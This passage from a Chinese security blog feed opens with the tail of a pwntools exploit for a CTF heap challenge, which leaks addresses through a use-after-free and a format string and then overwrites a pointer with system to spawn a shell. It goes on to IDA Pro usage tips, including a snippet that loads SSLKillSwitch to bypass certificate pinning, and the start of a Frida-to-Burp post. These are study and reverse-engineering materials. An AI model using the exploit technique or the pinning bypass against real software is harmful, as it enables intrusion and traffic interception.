class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(u64(data.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)))))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">global</span> printf_addr</span><br><span class="line">    <span class="comment">#step 1 create &amp; delete</span></span><br><span class="line">    create(<span class="number">4</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">    create(<span class="number">4</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#step 2 recover old function addr</span></span><br><span class="line">    pwn = ELF(<span class="string">&#x27;./pwn-f&#x27;</span>)</span><br><span class="line">    payload = <span class="string">&quot;aaaaaaaa&quot;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;b&#x27;</span>)+<span class="string">&#x27;\x2d&#x27;</span><span class="comment">#  recover low bits,the reason why i choose \x2d is that the system flow decide by</span></span><br><span class="line">    create(<span class="number">0x20</span>,payload) <span class="comment"># 申请大于0xf的内存会多申请一次 占位chunk0 和 chunk1,申请的内容覆盖 chunk1-&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#调用的是之前留下的chunk1 然后被覆盖</span></span><br><span class="line">    delete(<span class="number">1</span>) <span class="comment"># call free -&gt; call _puts</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#step 3 leak base addr</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(data)&gt;<span class="number">8</span>:</span><br><span class="line">        data=data[:<span class="number">8</span>]</span><br><span class="line">    data = u64(data.ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>))<span class="comment"># leaked puts address use it to calc base addr</span></span><br><span class="line">    pwn_base_addr = data - <span class="number">0xd2d</span> <span class="comment"># 减去二进制base</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;pwn_base_addr : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(pwn_base_addr))) <span class="comment"># 找到了plt表的基地址，下面就是对于格式化字符串的利用</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># free -&gt; printf</span></span><br><span class="line">    <span class="comment"># 我们首先create字符串调用delete 此时freeshort地址变成了printf，可以控制打印</span></span><br><span class="line">    <span class="comment">#step 4 get printf func addr</span></span><br><span class="line">    printf_plt = pwn.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">    printf_addr = pwn_base_addr + printf_plt <span class="comment">#get real printf addr</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;printf_addr : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(printf_addr)))</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#step 5 leak system addr</span></span><br><span class="line">    create(<span class="number">0x20</span>,payload)  <span class="comment"># 继续调用 free  -&gt; puts</span></span><br><span class="line">    delete(<span class="number">1</span>) <span class="comment">#this one can not be ignore because DynELF use the delete() at begin</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 泄露malloc_addr</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload = <span class="string">&#x27;a%9$s&#x27;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;#&#x27;</span>) + p64(printf_addr) <span class="comment">#覆盖chunk1的 free函数-&gt; printf</span></span><br><span class="line">    create(<span class="number">0x20</span>,payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line">    p.send(<span class="string">&quot;delete &quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;id:&quot;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(<span class="number">1</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;?:&quot;</span>)</span><br><span class="line">    p.send(<span class="string">&quot;yes.1111&quot;</span>+p64(elf.got[<span class="string">&quot;malloc&quot;</span>] + pwn_base_addr)+<span class="string">&quot;\n&quot;</span>) <span class="comment"># 触发 printf漏洞</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">&#x27;####&#x27;</span>)[:-<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">    malloc_addr = u64(data.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    log.info(<span class="string">&quot;malloc_addr : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(malloc_addr)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 泄露 puts_addr</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    payload = <span class="string">&#x27;a%9$s&#x27;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;#&#x27;</span>) + p64(printf_addr) <span class="comment">#覆盖chunk1的 free函数-&gt; printf</span></span><br><span class="line">    create(<span class="number">0x20</span>,payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;quit&quot;</span>)</span><br><span class="line">    p.send(<span class="string">&quot;delete &quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;id:&quot;</span>)</span><br><span class="line">    p.send(<span class="built_in">str</span>(<span class="number">1</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;?:&quot;</span>)</span><br><span class="line">    p.send(<span class="string">&quot;yes.1111&quot;</span>+p64(elf.got[<span class="string">&quot;puts&quot;</span>] + pwn_base_addr)+<span class="string">&quot;\n&quot;</span>) <span class="comment"># 触发 printf漏洞</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">&#x27;####&#x27;</span>)[:-<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">    puts_addr = u64(data.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    log.info(<span class="string">&quot;puts_addr : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_addr)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 通过两个libc函数计算libc ,确定system_addr</span></span><br><span class="line">    <span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">    obj = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">    obj.add_condition(<span class="string">&quot;malloc&quot;</span>, malloc_addr)</span><br><span class="line">    <span class="comment"># obj.selectin_id(3)</span></span><br><span class="line"></span><br><span class="line">    libc_base = malloc_addr-obj.dump(<span class="string">&quot;malloc&quot;</span>)</span><br><span class="line">    system_addr = obj.dump(<span class="string">&quot;system&quot;</span>)+libc_base  <span class="comment"># system 偏移</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;system_addr : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_addr))) <span class="comment"># 找到了plt表的基地址，下面就是对于格式化字符串的利用</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#step 6 recover old function to system then get shell</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    create(<span class="number">0x20</span>,<span class="string">&#x27;/bin/bash;&#x27;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;#&#x27;</span>)+p64(system_addr)) <span class="comment"># attention /bin/bash; i don`t not why add the &#x27;;&#x27;</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过这些入门pwn知识的学习，对栈溢出,堆溢出,uaf的利用会有清晰的理解。对以后分析真实利用场景漏洞有很大的帮助。利用脚本尽量做的通用，考虑多个平台。那么分析利用有了，对于漏洞挖掘这方面又是新的一个课题，对于这方面的探索将另外写文章分析。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6">linux程序的常用保护机制</a><br><a href="http://www.gandalf.site/2019/03/linux-pwn.html">linux-pwn</a><br><a href="https://blog.csdn.net/zhy557/article/details/80832268">https://blog.csdn.net/zhy557/article/details/80832268</a></p>
]]></content>
  </entry>
  <entry>
    <title>ida_help</title>
    <url>/2020/04/06/tips_about/ida-help/</url>
    <content><![CDATA[<p>[TOC]</p>
<!--toc-->

<span id="more"></span>

<h1 id="IDA-Pro使用技巧总结"><a href="#IDA-Pro使用技巧总结" class="headerlink" title="IDA_Pro使用技巧总结"></a>IDA_Pro使用技巧总结</h1><h2 id="IDA常见命名意义"><a href="#IDA常见命名意义" class="headerlink" title="IDA常见命名意义"></a>IDA常见命名意义</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub 指令和子函数起点</span><br><span class="line">locret 返回指令</span><br><span class="line">loc 指令</span><br><span class="line">off 数据，包含偏移量</span><br><span class="line">seg 数据，包含段地址值</span><br><span class="line">asc 数据，ASCII字符串</span><br><span class="line">byte 数据，字节（或字节数组）</span><br><span class="line">word 数据，16位数据（或字数组）</span><br><span class="line">dword 数据，32位数据（或双字数组）</span><br><span class="line">qword 数据，64位数据（或4字数组）</span><br><span class="line">flt 浮点数据，32位（或浮点数组）</span><br><span class="line">dbl 浮点数，64位（或双精度数组）</span><br><span class="line">tbyte 浮点数，80位（或扩展精度浮点数）</span><br><span class="line">stru 结构体(或结构体数组)</span><br><span class="line">algn 对齐指示</span><br><span class="line">unk 未处理字节</span><br><span class="line">IDA中有常见的说明符号，如db、dw、dd分别代表了1个字节、2个字节、4个字节</span><br></pre></td></tr></table></figure>

<h2 id="ida-python"><a href="#ida-python" class="headerlink" title="ida python"></a>ida python</h2><p><a href="https://www.hex-rays.com/products/ida/support/idapython_docs/">https://www.hex-rays.com/products/ida/support/idapython_docs&#x2F;</a><br>idaapi模块负责访问核心IDA API<br>idc模块负责提供IDA中的所有函数功能<br>idautils模块负责提供大量实用函数，其中许多函数可以生成各种数据库相关对象的python列表</p>
<p>指定judg函数的0-181范围的字节异或0xc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">judge=0x600B00</span><br><span class="line">for i in range(182):</span><br><span class="line">    addr=0x600B00+i</span><br><span class="line">    byte=get_bytes(addr,1)#获取指定地址的指定字节数</span><br><span class="line">    byte=ord(byte)^0xC</span><br><span class="line">    patch_byte(addr,byte)#打patch修改字节</span><br></pre></td></tr></table></figure>
<p>在菜单栏中file–&gt;script file，加载python脚本</p>
<h2 id="IDA-详细插件"><a href="#IDA-详细插件" class="headerlink" title="IDA 详细插件"></a>IDA 详细插件</h2><p><a href="https://github.com/onethawt/idaplugins-list">https://github.com/onethawt/idaplugins-list</a></p>
<h3 id="Keypatch"><a href="#Keypatch" class="headerlink" title="Keypatch"></a>Keypatch</h3><h3 id="heap-viewer-方便查堆"><a href="#heap-viewer-方便查堆" class="headerlink" title="heap-viewer 方便查堆"></a>heap-viewer 方便查堆</h3><p><a href="https://github.com/danigargu/heap-viewer">https://github.com/danigargu/heap-viewer</a></p>
<h3 id="findcrypt-yara-查找加密"><a href="#findcrypt-yara-查找加密" class="headerlink" title="findcrypt-yara 查找加密"></a>findcrypt-yara 查找加密</h3><h3 id="FRIEND"><a href="#FRIEND" class="headerlink" title="FRIEND"></a>FRIEND</h3><p>Flexible Register&#x2F;Instruction Extender aNd Documentation<br><a href="https://github.com/alexhude/FRIEND">https://github.com/alexhude/FRIEND</a><br>重新打开 IDA，点击Edit–&gt;Plugins就可以看到FRIEND插件了。<br>&#x2F;Users&#x2F;shellcodepanda&#x2F;Documents&#x2F;panda&#x2F;ida_about&#x2F;ida_plugin&#x2F;FRIEND&#x2F;Configurations&#x2F;AArch64_armv8arm_k.xml<br>导入后，选择自己想要文档化的内容，并勾选下面三个勾，允许做处理器扩展、允许显示提示、允许显示函数概要。点击 OK。</p>
<h3 id="C-filt"><a href="#C-filt" class="headerlink" title="C++filt"></a>C++filt</h3><p>可以用于显示出c++中复杂的重载后的函数名称</p>
<h3 id="strip"><a href="#strip" class="headerlink" title="strip"></a>strip</h3><p>可用于elf去符号，去符号后仍然保持正常功能但增加了逆向的难度，出题恶人必备</p>
<h3 id="比较插件"><a href="#比较插件" class="headerlink" title="比较插件"></a>比较插件</h3><h4 id="ida-bindiff-补丁比较情况"><a href="#ida-bindiff-补丁比较情况" class="headerlink" title="ida bindiff  补丁比较情况"></a>ida bindiff  补丁比较情况</h4><p>BinDiff是二进制文件的比较工具，可帮助漏洞研究人员和工程师快速找到反汇编代码中的差异和相似之处。<br>使用BinDiff，您可以识别并隔离供应商提供的修补程序中的漏洞修复程序。您还可以在同一二进制文件的多个版本的反汇编之间移植符号和注释，或使用BinDiff收集代码被盗或专利侵权的证据。</p>
<h4 id="IDA-对比-F5-显示差异-diaphora"><a href="#IDA-对比-F5-显示差异-diaphora" class="headerlink" title="IDA 对比 F5 显示差异 diaphora"></a>IDA 对比 F5 显示差异 diaphora</h4><p>Diaphora，最先进的免费开源二进制文件对比工具。<br>Diaphora是一个IDA插件，用来帮助二进制文件对比。他和其他的比较工具很类似，有一个著名的开源工具就叫做Zynamics BinDiff。还有其他的开源工具，比如DarunGrim或者是TurboDiff。但是从实际使用结果上来看，这些Diaphora能够进行更多的操作，并且能够更好地识别效果。它是在SyScan 2015期间发布的。<br>通过bindiff或者diaphora来对比不同是ida数据库，以获取函数的特征也是种很好的方法，这种方法在平时分析静态链接的程序也很有用。</p>
<h4 id="签名比较"><a href="#签名比较" class="headerlink" title="签名比较"></a>签名比较</h4><p>idb2pat.py+sigmake制作签名<br>idb2pat.py是火眼公司FireEye Labs Advanced Reverse Engineering团队编写的脚本，代码在GitHub上开源，该脚本主要通过CRC16的方式来计算每个函数块的特性，从而来识别不同的函数。这点也和IDA官方对签名文件的说明相符合，参见IDA F.L.I.R.T. Technology: In-Depth。</p>
<h4 id="Rizzo插件生成数据库识别"><a href="#Rizzo插件生成数据库识别" class="headerlink" title="Rizzo插件生成数据库识别"></a>Rizzo插件生成数据库识别</h4><p>关于rizzo，可以参看GitHub上的介绍Rizzo，同样也是一种对ida数据库进行保存然后提取信息进行对比的工具，收录于devttys0的ida脚本目录中。自己也进行了测试，速度还可以。<br>Create function signatures that can be shared amongst different projects. There are multiple sets of signatures that are generated:</p>
<h4 id="脚本扩展Sark"><a href="#脚本扩展Sark" class="headerlink" title="脚本扩展Sark"></a>脚本扩展Sark</h4><p>Sark, (named after the notorious Tron villain,) is an object-oriented scripting layer written on top of IDAPython to provide ease of use, as well as additional tools for writing advanced scripts and plugins.</p>
<p><a href="https://sark.readthedocs.io/en/latest/Installation.html">https://sark.readthedocs.io/en/latest/Installation.html</a></p>
<p>&#x2F;usr&#x2F;local&#x2F;bin&#x2F;pip.bak install -U git+<a href="https://github.com/tmr232/Sark.git@IDA-6.x#egg=Sarks">https://github.com/tmr232/Sark.git@IDA-6.x#egg=Sarks</a></p>
<h3 id="配色"><a href="#配色" class="headerlink" title="配色"></a>配色</h3><p><a href="https://blog.csdn.net/LPWSTR/article/details/78409727">https://blog.csdn.net/LPWSTR/article/details/78409727</a><br><a href="https://github.com/zyantific/IDASkins">https://github.com/zyantific/IDASkins</a><br>IDA的Edit菜单的Plugins子菜单中即可找到SkinPlugin选项，点击后在窗口中选择合适的主题<br><a href="https://github.com/0xItx/ida_nightfall">https://github.com/0xItx/ida_nightfall</a>   汇编指令的颜色同一修改为了蓝色。</p>
<h3 id="Data-Visualization-Plugin-for-IDA-Pro"><a href="#Data-Visualization-Plugin-for-IDA-Pro" class="headerlink" title="Data Visualization Plugin for IDA Pro"></a>Data Visualization Plugin for IDA Pro</h3><p><a href="https://github.com/patois/IDACyber">https://github.com/patois/IDACyber</a></p>
<h3 id="bap-ida-python"><a href="#bap-ida-python" class="headerlink" title="bap-ida-python"></a>bap-ida-python</h3><p>bap也不是很出名哇<br><a href="https://github.com/BinaryAnalysisPlatform/bap-ida-python">https://github.com/BinaryAnalysisPlatform/bap-ida-python</a></p>
<h3 id="win-tools"><a href="#win-tools" class="headerlink" title="win_tools"></a>win_tools</h3><h4 id="PE-tools："><a href="#PE-tools：" class="headerlink" title="PE tools："></a>PE tools：</h4><p>是一组用于分析Windows系统中正在运行的进程和可执行文件的工具</p>
<h2 id="ida-watch"><a href="#ida-watch" class="headerlink" title="ida watch"></a>ida watch</h2><p>右键AddWatch或直接按Insert键，插入一个寄存器v0，注意大小写；<br>插入时我们需要指定变量的类型，如（String）v1，（char *）v2，（int）v3等形式类似于C++里的类型强转。这样我们才可以看到寄存器的值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ida调试Dalvik显示局部变量</span><br><span class="line">(Object*)v2</span><br><span class="line">(String)v2</span><br><span class="line">(char*)v2</span><br><span class="line">(int)v2</span><br></pre></td></tr></table></figure>
<h2 id="比较二进制"><a href="#比较二进制" class="headerlink" title="比较二进制"></a>比较二进制</h2><p>&#x2F;Users&#x2F;shellcodepanda&#x2F;Documents&#x2F;panda&#x2F;ida_about&#x2F;ida_plugin&#x2F;ida比较工具&#x2F;diaphora_1.2.4_python2_ida_695_to_73&#x2F;diaphora.py<br>导入后，选择生成sqlite 或者选择另一个进行比较，选择Use slow heuristics. 会比较好点。</p>
<h2 id="ida7-0-中文"><a href="#ida7-0-中文" class="headerlink" title="ida7.0 中文"></a>ida7.0 中文</h2><p>IDA string window显示中文 Options -&gt; Stings -&gt; Unicode C-style(16 bits)<br>ctrol+F5  会导出所有F5 文件 这样搜索中文？</p>
<h2 id="IDA反编译会出现问题IDA-sp-analysis-failed-不能F5"><a href="#IDA反编译会出现问题IDA-sp-analysis-failed-不能F5" class="headerlink" title="IDA反编译会出现问题IDA sp-analysis failed 不能F5"></a>IDA反编译会出现问题IDA sp-analysis failed 不能F5</h2><p><a href="http://bbs.pediy.com/thread-140002.htm">http://bbs.pediy.com/thread-140002.htm</a><br><a href="http://blog.csdn.net/dj0379/article/details/8699219">http://blog.csdn.net/dj0379/article/details/8699219</a><br><a href="https://reverseengineering.stackexchange.com/questions/3197/fixing-the-stackpointer-in-ida-when-exception-handlers-are-used">https://reverseengineering.stackexchange.com/questions/3197/fixing-the-stackpointer-in-ida-when-exception-handlers-are-used</a><br><a href="http://blog.csdn.net/zhangmiaoping23/article/details/43492641">http://blog.csdn.net/zhangmiaoping23/article/details/43492641</a><br>1.花指令patch</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">分析之后不难发现不能F5的原因,就在于跳转.</span><br><span class="line">一个函数里面的一个跳转在未知的情况下会出现不能F5.</span><br><span class="line">	</span><br><span class="line">.text:00401675 pop ebp</span><br><span class="line">.text:00401676 pop esi</span><br><span class="line">.text:00401677 pop ecx</span><br><span class="line">.text:00401678 retn</span><br><span class="line">.text:00401678 sub_4015ED endp ; sp-analysis failed</span><br><span class="line">.text:00401642 mov eax, offset loc_40164A</span><br><span class="line">.text:00401647 jmp eax</span><br><span class="line">用OD打开之后 改掉代码在保存,然后重新用IDA打开 F5就可以了,sp-analysis failed 也就消失了.</span><br><span class="line">在OD里直接改成 JMP 40164A  </span><br></pre></td></tr></table></figure>
<ol>
<li>413238:positive sp value has been found<br><img src="/media/15865894340527.jpg"><br>那我们就去找413238这个地址的地方，提示是说sp指针的值没有被找到，说明是这里出错了，那么就去修改sp的值，修改方法如下：<br><img src="/media/15865894821928.jpg"><br>也可以使用快捷键 Alt+K<br>3.xxx: can analysis failed<br><img src="/media/15865896765840.jpg"><br>就尝试着把报错的地址的汇编语句改一哈，改成nop，就可以解决问题</li>
</ol>
<h2 id="IDA显示-thumb"><a href="#IDA显示-thumb" class="headerlink" title="IDA显示 thumb"></a>IDA显示 thumb</h2><p>下断要减1  thumb指令<br>用IDA反汇编NDK程序的时候 发现很多程序都会反汇编错误，那是因为IDA在对 ARM反汇编的时候模式不正确。因为在动态调试 的时候，IDA并没有去解析elf模块中的一些信息，<br>造成了模块信息丢失并且反汇编就会出现错误。 这时我们可以通过更改段寄存器的值来更改反汇编模式，<br>如下图，按 “ALT+G”会出现如下窗口，把 Value 的 0x00 改为 0x01<br>0为ARM  1为 thumb</p>
<h2 id="IDA-快捷键-配置"><a href="#IDA-快捷键-配置" class="headerlink" title="IDA 快捷键_配置"></a>IDA 快捷键_配置</h2><p>ctrl+w：保存ida数据库<br>ctrl+s：选择某个数据段，直接进行跳转<br>ctrl+鼠标滚轮：能够调节流程视图的大小</p>
<p>配置IDA<br>一、ida.cfg<br><strong>SHOW_AUTOCOMMENTS</strong> 表示是否自动生成汇编指令的注释<br><strong>GRAPH_SHOW_LINEPREFIXES</strong> 表示是否在流程控制视图中显示地址<br><strong>VPAGESIZE</strong> 表示内存调整参数，当处理非常大的输入文件时，IDA可能报告内存不足而无法创建新数据库，在这种情况下增大该参数，重新打开输入文件即可解决问题<br><strong>OPCODE_BYTES</strong> 表示要显示的操作码字节数的默认值<br><strong>INDENTATION</strong> 表示指令缩进的距离<br><strong>NameChars</strong> 表示IDA支持的变量命令使用的字符集，默认是数字+字母还有几个特殊符号，如果需要添加就改变该参数<br>二、idagui.cfg<br>这个文件主要配置默认的GUI行为，键盘的快捷键等，这个很少需要修改，不做过多介绍。感兴趣的可以自己打开该文件观察，并不难懂，改改快捷键还是很容易的<br>三、idatui.cfg</p>
<p>；：在反汇编后的界面中写下注释<br>&#x2F; ：在反编译后伪代码的界面中写下注释<br>\：在反编译后伪代码的界面中隐藏&#x2F;显示变量和函数的类型描述，有时候变量特别多的时候隐藏掉类型描述看起来会轻松很多</p>
<p>ctrl+shift+w：拍摄IDA快照<br>由于IDA不提供撤销的功能，如果你不小心按到某个键，导致ida数据库发生了改变，就得重新来过，所以要记得在经常操作的时候，加上快照：file–&gt;take database snapshot<br>加完快照后，会生成一个新的ida数据库文件，本质上是有点像另存的操作<br>生成 b00ks_20200411145256.i64</p>
<p>windows–&gt;reset desktop: 可以恢复初始ida布局</p>
<p>u：undefine，取消定义函数、代码、数据的定义</p>
<p>内存快照<br>创建完函数后，再将sub_401030函数重命名为reg_modify_401030，方便标记。然后，就到了本章重点，点击Debugger -&gt; Take memory snapshot，就可以拍摄内存快照了。<br>拍完快照后，就无需在使用调试了，直接断开远程调试功能。断开远程后，因为拍摄了内存快照，所以off_40E000这些动态变量还是保留着之前的赋值，这就是内存快照的功能，相当于你不用在虚拟机里给样本解密&#x2F;脱壳，就能直接通过内存快照分析解密&#x2F;脱壳后的样本。</p>
<p>函数调用图<br>菜单栏中：view–&gt;graphs–&gt;Function calls(快捷键Ctrl+F12)<br><img src="/media/15865887458893.jpg"></p>
<p>导入C语言声明的结构体<br>实际上，IDA有提供一个更方便的创建结构体的方法，就是直接写代码导入<br>在View–&gt;Open Subviews–&gt;Local Types中可以看到本地已有的结构体，在该窗口中右击insert<br>可以添加新的结构体：</p>
<p>ida调试<br>F7 单步步入，遇到函数，将进入函数代码内部<br>F8 单步步过，执行下一条指令，不进入函数代码内部<br>F4 运行到光标处（断点处）<br>F9 继续运行<br>CTRL+F2 终止一个正在运行的调试进程<br>CTRL+F7 运行至返回,直到遇到RETN（或断点）时才停止.</p>
<p>ALT+M   添加标签  记录位置<br>ctrol+M  查看标签<br>IDA  ctrol F5 可以导出 函数名和 伪C代码<br>对光标处<br>C 解析为代码<br>D 解析为数据<br>A 解析为ASCII码字符串<br>U 解析为未定义的内容<br>ALT+T 搜索文本字符串<br>ALT+B 搜索十六进制字节序列</p>
<h2 id="64位参数会在函数中存在两个参数！-IDA中看到4个参数，改参数"><a href="#64位参数会在函数中存在两个参数！-IDA中看到4个参数，改参数" class="headerlink" title="64位参数会在函数中存在两个参数！ IDA中看到4个参数，改参数"></a>64位参数会在函数中存在两个参数！ IDA中看到4个参数，改参数</h2><p>signed int replace_GetRawKBSync_sub_1D060(long long  a1, int a3_11, id *a4)  IDA 中会有4个参数。</p>
<h2 id="IDA-脚本-调用函数"><a href="#IDA-脚本-调用函数" class="headerlink" title="IDA 脚本 调用函数"></a>IDA 脚本 调用函数</h2><p><a href="http://www.hexblog.com/?p=113">http://www.hexblog.com/?p=113</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Appcall.set_appcall_options(0x0)</span><br><span class="line">api_dlopen = Appcall.proto(LocByName(&quot;_dlopen&quot;),&quot;void *__cdecl dlopen(const char *path, int mode);&quot;)</span><br><span class="line">#print &quot;api_dlopen = %x\n&quot;,hex(api_dlopen)</span><br><span class="line">Message(&quot;Load ssl kill\n&quot;)</span><br><span class="line">remote_sslkill_path = &quot;/Users/panda/Documents/Github/ssl-kill-switch2/layout/SSLKillSwitch.framework/Versions/A/SSLKillSwitch&quot;</span><br><span class="line">api_dlopen(remote_sslkill_path, 1)</span><br><span class="line">RefreshDebuggerMemory()</span><br></pre></td></tr></table></figure>

<h2 id="ida静态分析"><a href="#ida静态分析" class="headerlink" title="ida静态分析"></a>ida静态分析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IDA  静态分析</span><br><span class="line">ar_38= -0x38</span><br><span class="line">var_30= -0x30</span><br><span class="line">var_28= -0x28</span><br><span class="line">var_20= -0x20</span><br><span class="line">var_18= -0x18</span><br><span class="line">var_10= -0x10  注意这里是 - not +</span><br><span class="line">STP             X10, X11, [SP,#0xB0+var_60] 看这里   [SP,#0xB0+var_60] = x10   [SP,#0xB0+var_58]=x11</span><br><span class="line">STP             X9, X8, [SP,#0xB0+var_70] </span><br><span class="line">。。。。</span><br><span class="line">STUR            X0, [X29,#var_18]</span><br><span class="line">LDUR            X8, [X29,#var_8]</span><br><span class="line">LDUR            X2, [X29,#var_18]</span><br><span class="line">LDR             X0, [SP,#0xB0+var_58]</span><br><span class="line">LDR             X1, [X0] ; decodeMachOHeader</span><br><span class="line">MOV             X0, X8</span><br><span class="line">BL              _objc_msgSend</span><br></pre></td></tr></table></figure>
<h2 id="android"><a href="#android" class="headerlink" title="android"></a>android</h2><h3 id="导入ida看符号"><a href="#导入ida看符号" class="headerlink" title="导入ida看符号"></a>导入ida看符号</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$JADX_CONSOLE --output-dir-src java_dir app-release/classes.dex</span><br><span class="line">python $make_sig -d java_dir -o method_sig.txt</span><br><span class="line">IDA use py /Users/shellcodepanda/Documents/android_tools/ida_idc_py/jni_helper.py</span><br><span class="line"></span><br><span class="line">dash ``ida_xxxx</span><br><span class="line"></span><br><span class="line">先使用ida打开要分析的程序，等ida自动分析完成，本脚本会根据jni的调用的偏移值在ida中创建两个枚举类型，支持F5插件，</span><br><span class="line">然后扫描用户的函数，根据汇编指令自动分析jni调用点，添加注释，如果遇到无法识别的指令，可以在偏移上面按m键手动设置。</span><br><span class="line">如果未成功自动识别，请按m手动设置。</span><br><span class="line">使用ALT+fn+F7 &#123;ida_jni_path&#125;</span><br></pre></td></tr></table></figure>
<h2 id="iOS"><a href="#iOS" class="headerlink" title="iOS"></a>iOS</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">111</span><br></pre></td></tr></table></figure>
<h2 id="macos"><a href="#macos" class="headerlink" title="macos"></a>macos</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">222</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/4205#toc-0">IDA Pro7.0使用技巧总结</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>ida</category>
        <category>tips</category>
      </categories>
      <tags>
        <tag>ida</tag>
        <tag>脚本</tag>
        <tag>tips</tag>
      </tags>
  </entry>
  <entry>
    <title>frida-trace扩展信息到burp</title>
    <url>/2020/03/13/frida_about/frida-trace-burp/</url>
    <content><![CDATA[<h1 id="frida-trace扩展信息到burp"><a href="#frida-trace扩展信息到burp" class="headerlink" title="frida-trace扩展信息到burp"></a>frida-trace扩展信息到burp</h1><p>[TOC]</p>
<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>参考原文<a href="https://cedricvb.be/post/tracing-api-calls-in-burp-with-frida/#prettyPhoto">Tracing API calls in Burp with Frida</a></p>
<p>利用frida实现一个与burp结合实时修改二进制函数参数返回值插件。</p>
<ol>
<li>可以burp查看frida hook的值，burp有很多非常人性化的界面可以参考。</li>
<li>可以burp修改hook的参数，注入测试<ol>
<li>NSString*</li>
<li>NSData*</li>
<li>byte * or char*<span id="more"></span></li>
</ol>
</li>
</ol>
